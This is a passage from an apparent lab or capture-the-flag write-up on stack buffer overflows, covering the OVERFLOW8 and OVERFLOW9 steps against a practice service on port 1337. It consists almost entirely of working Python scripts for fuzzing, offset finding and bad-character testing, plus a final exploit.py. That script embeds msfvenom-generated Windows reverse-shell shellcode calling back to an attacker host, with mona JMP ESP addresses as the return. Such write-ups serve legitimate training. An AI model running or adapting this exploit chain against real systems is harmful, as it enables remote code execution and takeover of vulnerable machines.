class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;latin-1&quot;</span>))</span><br><span class="line">print(<span class="string">&quot;Done!&quot;</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">print(<span class="string">&quot;Could not connect.&quot;</span>)</span><br></pre></td></tr></table></figure><blockquote><p>Not all of these might be badchars! Sometimes badchars cause the next byte to get corrupted as well, or even effect the rest of the string.</p></blockquote><p>BADCHAR: <code>\x00\x1d\x1e\x2e\x2f\xc7\xc8\xee\xef</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># badchar_confirm.py</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;10.10.90.129&quot;</span></span><br><span class="line">port = <span class="number">1337</span></span><br><span class="line"></span><br><span class="line">prefix = <span class="string">&quot;OVERFLOW8 &quot;</span></span><br><span class="line">offset = <span class="number">1786</span></span><br><span class="line">overflow = <span class="string">&quot;A&quot;</span> * offset</span><br><span class="line">retn = <span class="string">&quot;BBBB&quot;</span></span><br><span class="line">padding = <span class="string">&quot;&quot;</span></span><br><span class="line">payload = <span class="string">&quot;\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1c\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2d\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc6\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xed\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&quot;</span></span><br><span class="line">postfix = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">buffer = prefix + overflow + retn + padding + payload + postfix</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">s.connect((ip, port))</span><br><span class="line">print(<span class="string">&quot;Sending evil buffer...&quot;</span>)</span><br><span class="line">s.send(<span class="built_in">bytes</span>(buffer + <span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;latin-1&quot;</span>))</span><br><span class="line">print(<span class="string">&quot;Done!&quot;</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">print(<span class="string">&quot;Could not connect.&quot;</span>)</span><br></pre></td></tr></table></figure><p>去掉BADCHAR<code>\x1d\x2e\xc7\xee</code>之后<code>\x1e\x2f\xc8\xef</code>不受影响</p><p>BADCHAR: <code>\x00\x1d\x2e\xc7\xee</code></p><h3 id="jmp-esp-8"><a class="markdownIt-Anchor" href="#jmp-esp-8"></a> JMP ESP</h3><p>Immunity Debugger</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!mona jmp -r esp -cqb &quot;\x00\x1d\x2e\xc7\xee&quot;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0x625011af</span><br><span class="line">0x625011bb</span><br><span class="line">0x625011c7</span><br><span class="line">0x625011d3</span><br><span class="line">0x625011df</span><br><span class="line">0x625011eb</span><br><span class="line">0x625011f7</span><br><span class="line">0x62501203</span><br><span class="line">0x62501205</span><br></pre></td></tr></table></figure><h3 id="shellcode-8"><a class="markdownIt-Anchor" href="#shellcode-8"></a> SHELLCODE</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/shell_reverse_tcp LHOST=10.17.42.96 LPORT=1337 -b <span class="string">&quot;\x00\x1d\x2e\xc7\xee&quot;</span> -f c</span><br></pre></td></tr></table></figure><h3 id="exploit-8"><a class="markdownIt-Anchor" href="#exploit-8"></a> EXPLOIT</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># exploit.py</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;10.10.90.129&quot;</span></span><br><span class="line">port = <span class="number">1337</span></span><br><span class="line"></span><br><span class="line">prefix = <span class="string">&quot;OVERFLOW8 &quot;</span></span><br><span class="line">offset = <span class="number">1786</span></span><br><span class="line">overflow = <span class="string">&quot;A&quot;</span> * offset</span><br><span class="line">retn = <span class="string">&quot;\xaf\x11\x50\x62&quot;</span></span><br><span class="line">padding = <span class="string">&quot;\x90&quot;</span> * <span class="number">16</span></span><br><span class="line">payload = <span class="string">&quot;\xb8\xf3\x53\x39\x5d\xda\xc2\xd9\x74\x24\xf4\x5b\x31\xc9\xb1\x52\x31\x43\x12\x03\x43\x12\x83\x30\x57\xdb\xa8\x4a\xb0\x99\x53\xb2\x41\xfe\xda\x57\x70\x3e\xb8\x1c\x23\x8e\xca\x70\xc8\x65\x9e\x60\x5b\x0b\x37\x87\xec\xa6\x61\xa6\xed\x9b\x52\xa9\x6d\xe6\x86\x09\x4f\x29\xdb\x48\x88\x54\x16\x18\x41\x12\x85\x8c\xe6\x6e\x16\x27\xb4\x7f\x1e\xd4\x0d\x81\x0f\x4b\x05\xd8\x8f\x6a\xca\x50\x86\x74\x0f\x5c\x50\x0f\xfb\x2a\x63\xd9\x35\xd2\xc8\x24\xfa\x21\x10\x61\x3d\xda\x67\x9b\x3d\x67\x70\x58\x3f\xb3\xf5\x7a\xe7\x30\xad\xa6\x19\x94\x28\x2d\x15\x51\x3e\x69\x3a\x64\x93\x02\x46\xed\x12\xc4\xce\xb5\x30\xc0\x8b\x6e\x58\x51\x76\xc0\x65\x81\xd9\xbd\xc3\xca\xf4\xaa\x79\x91\x90\x1f\xb0\x29\x61\x08\xc3\x5a\x53\x97\x7f\xf4\xdf\x50\xa6\x03\x1f\x4b\x1e\x9b\xde\x74\x5f\xb2\x24\x20\x0f\xac\x8d\x49\xc4\x2c\x31\x9c\x4b\x7c\x9d\x4f\x2c\x2c\x5d\x20\xc4\x26\x52\x1f\xf4\x49\xb8\x08\x9f\xb0\x2b\x3d\x71\x90\xcb\x29\x73\xe4\x0e\x93\xfa\x02\x7a\xf3\xaa\x9d\x13\x6a\xf7\x55\x85\x73\x2d\x10\x85\xf8\xc2\xe5\x48\x09\xae\xf5\x3d\xf9\xe5\xa7\xe8\x06\xd0\xcf\x77\x94\xbf\x0f\xf1\x85\x17\x58\x56\x7b\x6e\x0c\x4a\x22\xd8\x32\x97\xb2\x23\xf6\x4c\x07\xad\xf7\x01\x33\x89\xe7\xdf\xbc\x95\x53\xb0\xea\x43\x0d\x76\x45\x22\xe7\x20\x3a\xec\x6f\xb4\x70\x2f\xe9\xb9\x5c\xd9\x15\x0b\x09\x9c\x2a\xa4\xdd\x28\x53\xd8\x7d\xd6\x8e\x58\x8d\x9d\x92\xc9\x06\x78\x47\x48\x4b\x7b\xb2\x8f\x72\xf8\x36\x70\x81\xe0\x33\x75\xcd\xa6\xa8\x07\x5e\x43\xce\xb4\x5f\x46&quot;</span></span><br><span class="line">postfix = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">buffer = prefix + overflow + retn + padding + payload + postfix</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">s.connect((ip, port))</span><br><span class="line">print(<span class="string">&quot;Sending evil buffer...&quot;</span>)</span><br><span class="line">s.send(<span class="built_in">bytes</span>(buffer + <span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;latin-1&quot;</span>))</span><br><span class="line">print(<span class="string">&quot;Done!&quot;</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">print(<span class="string">&quot;Could not connect.&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="overflow9"><a class="markdownIt-Anchor" href="#overflow9"></a> OVERFLOW9</h2><h3 id="fuzz-9"><a class="markdownIt-Anchor" href="#fuzz-9"></a> FUZZ</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># fuzz.py</span></span><br><span class="line"><span class="keyword">import</span> socket, time, sys</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;10.10.90.129&quot;</span></span><br><span class="line"></span><br><span class="line">port = <span class="number">1337</span></span><br><span class="line">timeout = <span class="number">5</span></span><br><span class="line">prefix = <span class="string">&quot;OVERFLOW9 &quot;</span></span><br><span class="line"></span><br><span class="line">string = prefix + <span class="string">&quot;A&quot;</span> * <span class="number">100</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">with</span> socket.socket(socket.AF_INET, socket.SOCK_STREAM) <span class="keyword">as</span> s:</span><br><span class="line">s.settimeout(timeout)</span><br><span class="line">s.connect((ip, port))</span><br><span class="line">s.recv(<span class="number">1024</span>)</span><br><span class="line">print(<span class="string">&quot;Fuzzing with &#123;&#125; bytes&quot;</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(string) - <span class="built_in">len</span>(prefix)))</span><br><span class="line">s.send(<span class="built_in">bytes</span>(string, <span class="string">&quot;latin-1&quot;</span>))</span><br><span class="line">s.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">print(<span class="string">&quot;Fuzzing crashed at &#123;&#125; bytes&quot;</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(string) - <span class="built_in">len</span>(prefix)))</span><br><span class="line">sys.exit(<span class="number">0</span>)</span><br><span class="line">string += <span class="number">100</span> * <span class="string">&quot;A&quot;</span></span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Fuzzing crashed at 1600 bytes</span><br></pre></td></tr></table></figure><h3 id="offset-9"><a class="markdownIt-Anchor" href="#offset-9"></a> OFFSET</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1600</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># offset.py</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;10.10.90.129&quot;</span></span><br><span class="line">port = <span class="number">1337</span></span><br><span class="line"></span><br><span class="line">prefix = <span class="string">&quot;OVERFLOW9 &quot;</span></span><br><span class="line">offset = <span class="number">0</span></span><br><span class="line">overflow = <span class="string">&quot;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2C&quot;</span></span><br><span class="line">retn = <span class="string">&quot;&quot;</span></span><br><span class="line">padding = <span class="string">&quot;&quot;</span></span><br><span class="line">payload = <span class="string">&quot;&quot;</span></span><br><span class="line">postfix = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">buffer = prefix + overflow + retn + padding + payload + postfix</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">s.connect((ip, port))</span><br><span class="line">print(<span class="string">&quot;Sending evil buffer...&quot;</span>)</span><br><span class="line">s.send(<span class="built_in">bytes</span>(buffer + <span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;latin-1&quot;</span>))</span><br><span class="line">print(<span class="string">&quot;Done!&quot;</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">print(<span class="string">&quot;Could not connect.&quot;</span>)</span><br></pre></td></tr></table></figure><p>EIP: 35794234 -&gt; 5yB4 -&gt; 4By5</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 4By5 -l 1600</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[*] Exact match at offset 1514</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># offset_confirm.py</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;10.10.90.129&quot;</span></span><br><span class="line">port = <span class="number">1337</span></span><br><span class="line"></span><br><span class="line">prefix = <span class="string">&quot;OVERFLOW9 &quot;</span></span><br><span class="line">offset = <span class="number">1514</span></span><br><span class="line">overflow = <span class="string">&quot;A&quot;</span> * offset</span><br><span class="line">retn = <span class="string">&quot;BBBB&quot;</span></span><br><span class="line">padding = <span class="string">&quot;&quot;</span></span><br><span class="line">payload = <span class="string">&quot;&quot;</span></span><br><span class="line">postfix = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">buffer = prefix + overflow + retn + padding + payload + postfix</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">s.connect((ip, port))</span><br><span class="line">print(<span class="string">&quot;Sending evil buffer...&quot;</span>)</span><br><span class="line">s.send(<span class="built_in">bytes</span>(buffer + <span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;latin-1&quot;</span>))</span><br><span class="line">print(<span class="string">&quot;Done!&quot;</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">print(<span class="string">&quot;Could not connect.&quot;</span>)</span><br></pre></td></tr></table></figure><p>EIP: 42424242 -&gt; BBBB</p><h3 id="badchar-9"><a class="markdownIt-Anchor" href="#badchar-9"></a> BADCHAR</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># charset.py</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">256</span>):</span><br><span class="line">print(<span class="string">&quot;\\x&quot;</span> + <span class="string">&quot;&#123;:02x&#125;&quot;</span>.<span class="built_in">format</span>(x), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">print()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># badchar.py</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;10.10.90.129&quot;</span></span><br><span class="line">port = <span class="number">1337</span></span><br><span class="line"></span><br><span class="line">prefix = <span class="string">&quot;OVERFLOW9 &quot;</span></span><br><span class="line">offset = <span class="number">1514</span></span><br><span class="line">overflow = <span class="string">&quot;A&quot;</span> * offset</span><br><span class="line">retn = <span class="string">&quot;BBBB&quot;</span></span><br><span class="line">padding = <span class="string">&quot;&quot;</span></span><br><span class="line">payload = <span class="string">&quot;\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&quot;</span></span><br><span class="line">postfix = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">buffer = prefix + overflow + retn + padding + payload + postfix</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">s.connect((ip, port))</span><br><span class="line">print(<span class="string">&quot;Sending evil buffer...&quot;</span>)</span><br><span class="line">s.send(<span class="built_in">bytes</span>(buffer + <span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;latin-1&quot;</span>))</span><br><span class="line">print(<span class="string">&quot;Done!&quot;</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">print(<span class="string">&quot;Could not connect.&quot;</span>)</span><br></pre></td></tr></table></figure><blockquote><p>Not all of these might be badchars! Sometimes badchars cause the next byte to get corrupted as well, or even effect the rest of the string.</p></blockquote><p>BADCHAR: <code>\x00\x04\x05\x3e\x3f\xe1\xe2</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># badchar_confirm.py</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;10.10.90.129&quot;</span></span><br><span class="line">port = <span class="number">1337</span></span><br><span class="line"></span><br><span class="line">prefix = <span class="string">&quot;OVERFLOW9 &quot;</span></span><br><span class="line">offset = <span class="number">1514</span></span><br><span class="line">overflow = <span class="string">&quot;A&quot;</span> * offset</span><br><span class="line">retn = <span class="string">&quot;BBBB&quot;</span></span><br><span class="line">padding = <span class="string">&quot;&quot;</span></span><br><span class="line">payload = <span 